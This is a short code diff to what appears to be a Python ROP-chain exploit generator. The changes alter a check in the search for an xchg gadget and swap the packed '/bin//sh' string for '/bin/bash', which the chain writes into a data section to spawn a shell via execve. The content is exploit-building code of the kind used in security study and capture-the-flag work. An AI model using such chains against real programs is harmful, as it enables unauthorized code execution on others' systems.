@@ -159,11 +159,12 @@ def exploit(GadgetList, data_section_addr) :
 
         for List in xchgList: 
             gadget = List[0]
+
             if (("rax" in gadget['operands'] and "rdi" in gadget['operands']) or ("eax" in gadget['operands'] and "edi" in gadget['operands'])) : 
                 xchgAD = gadget
                 break
     
-    if len(xchgAD) != 3: 
+    if len(xchgAD) == 0: 
         print("No xchg gadgets found to load value of rax into rdi. so, Exploit fail!")
         sys.exit()
     
@@ -324,7 +325,10 @@ def exploit(GadgetList, data_section_addr) :
     # Let us spawn a shell - refer execveChain.py
 
     binsh = 0x68732f2f6e69622f
+    # binsh = 0x6873000000000000
     binsh = struct.pack('<Q', binsh)
+    binsh = b'/bin/bash'
+    # print(binsh)
     chain.WriteStuffIntoMemory(binsh, data_section_addr + 20, fd)
  
     # Step-1: rax <- 59
